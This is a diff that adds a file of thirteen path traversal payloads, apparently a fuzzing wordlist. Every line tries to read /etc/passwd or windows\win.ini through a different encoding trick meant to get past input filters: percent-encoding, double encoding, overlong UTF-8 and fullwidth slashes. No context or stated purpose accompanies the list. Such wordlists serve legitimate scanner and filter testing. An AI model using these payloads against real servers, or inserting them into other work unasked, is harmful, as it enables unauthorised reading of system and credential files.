@@ -1,0 +1,13 @@
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+%2E%2E%5C%2E%2E%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini
+..%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+..%2F..%252F..%252F..%252Fetc%252Fpasswd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+..%25%32%66..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd
+..%25%35%63..%25%35%63..%25%35%63..%25%35%63windows%25%35%63win.ini
